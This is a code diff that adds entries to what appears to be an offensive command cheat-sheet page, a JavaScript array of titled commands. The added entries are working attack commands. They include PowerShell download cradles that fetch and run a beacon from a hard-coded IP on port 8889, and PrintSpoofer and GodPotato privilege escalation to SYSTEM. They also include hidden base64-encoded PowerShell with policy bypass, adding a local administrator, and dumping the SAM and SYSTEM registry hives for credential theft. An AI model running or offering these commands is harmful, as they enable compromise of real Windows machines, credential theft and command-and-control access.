@@ -2360,6 +2360,102 @@ const COMMANDS = [
     tags: ["ps", "evasion"],
     accent: "#e91e63"
   },
+  {
+    title: "[PRIVESC-1] Encode Beacon Download",
+    code: "$cmd = 'IEX(IWR http://168.144.166.97:8889/beacon.ps1 -UseBasicParsing)'; [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))",
+    tags: ["ps", "privesc", "c2", "playbook"],
+    accent: "#9b59b6"
+  },
+  {
+    title: "[PRIVESC-2] VPS Serve Beacon",
+    code: "cd / && python3 -m http.server 8889",
+    tags: ["linux", "vps", "c2", "playbook"],
+    accent: "#00ff41"
+  },
+  {
+    title: "[PRIVESC-3] PrintSpoofer SYSTEM Shell",
+    code: "C:\\\\Windows\\\\Temp\\\\ps.exe -c \"powershell -ep bypass -w hidden -enc BASE64_HERE\"",
+    tags: ["cmd", "privesc", "playbook"],
+    accent: "#9b59b6"
+  },
+  {
+    title: "[PRIVESC] Download PrintSpoofer",
+    code: "IWR -Uri 'http://168.144.166.97:8889/PrintSpoofer.exe' -OutFile C:\\\\Windows\\\\Temp\\\\ps.exe -UseBasicParsing",
+    tags: ["ps", "privesc", "c2"],
+    accent: "#9b59b6"
+  },
+  {
+    title: "[PRIVESC] Download GodPotato",
+    code: "IWR -Uri 'http://168.144.166.97:8889/GodPotato.exe' -OutFile C:\\\\Windows\\\\Temp\\\\gp.exe -UseBasicParsing",
+    tags: ["ps", "privesc", "c2"],
+    accent: "#9b59b6"
+  },
+  {
+    title: "[PRIVESC] GodPotato SYSTEM Shell",
+    code: "C:\\\\Windows\\\\Temp\\\\gp.exe -cmd \"powershell -ep bypass -w hidden -enc BASE64_HERE\"",
+    tags: ["cmd", "privesc", "playbook"],
+    accent: "#9b59b6"
+  },
+  {
+    title: "[PRIVESC] Check SeImpersonate",
+    code: "whoami /priv | findstr SeImpersonate",
+    tags: ["cmd", "privesc", "recon"],
+    accent: "#9b59b6"
+  },
+  {
+    title: "[PRIVESC] PrintSpoofer Add Admin",
+    code: "C:\\\\Windows\\\\Temp\\\\ps.exe -c \"net localgroup administrators USERNAME /add\"",
+    tags: ["cmd", "privesc"],
+    accent: "#9b59b6"
+  },
+  {
+    title: "[PRIVESC] PrintSpoofer Dump SAM",
+    code: "C:\\\\Windows\\\\Temp\\\\ps.exe -c \"reg save HKLM\\\\SAM C:\\\\Windows\\\\Temp\\\\sam\"\nC:\\\\Windows\\\\Temp\\\\ps.exe -c \"reg save HKLM\\\\SYSTEM C:\\\\Windows\\\\Temp\\\\sys\"",
+    tags: ["cmd", "privesc", "postexploit"],
+    accent: "#9b59b6"
+  },
+  {
+    title: "[PRIVESC] VPS Get Potato Tools",
+    code: "cd /opt\\nwget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe -O PrintSpoofer.exe\\nwget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe -O GodPotato.exe",
+    tags: ["linux", "vps", "privesc"],
+    accent: "#00ff41"
+  },
+  {
+    title: "[CHAIN] Full SeImpersonate to SYSTEM",
+    code: "# 1. Check privs: whoami /priv | findstr SeImpersonate\\n# 2. Download: IWR http://VPS:8889/PrintSpoofer.exe -OutFile C:\\\\Temp\\\\ps.exe\\n# 3. Encode: [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('IEX(IWR http://VPS:8889/beacon.ps1)'))\\n# 4. Execute: C:\\\\Temp\\\\ps.exe -c 'powershell -enc BASE64'\\n# 5. Catch SYSTEM shell on C2",
+    tags: ["playbook", "privesc"],
+    accent: "#ffeb3b"
+  },
+  {
+    title: "Encode Any Command",
+    code: "$cmd = 'YOUR_COMMAND_HERE'; [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))",
+    tags: ["ps", "evasion"],
+    accent: "#e91e63"
+  },
+  {
+    title: "Decode Base64 Command",
+    code: "[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('BASE64_HERE'))",
+    tags: ["ps", "evasion"],
+    accent: "#e91e63"
+  },
+  {
+    title: "Run Encoded Command",
+    code: "powershell -ep bypass -w hidden -enc BASE64_HERE",
+    tags: ["cmd", "evasion", "c2"],
+    accent: "#e91e63"
+  },
+  {
+    title: "IEX Download Cradle",
+    code: "IEX(IWR http://168.144.166.97:8889/script.ps1 -UseBasicParsing)",
+    tags: ["ps", "c2", "evasion"],
+    accent: "#ff6b35"
+  },
+  {
+    title: "IEX via Variable",
+    code: "$u='http://168.144.166.97:8889/script.ps1'; IEX(IWR $u -UseBasicParsing)",
+    tags: ["ps", "c2", "evasion"],
+    accent: "#ff6b35"
+  },
 ];
 
 const list = document.getElementById('cmdList');
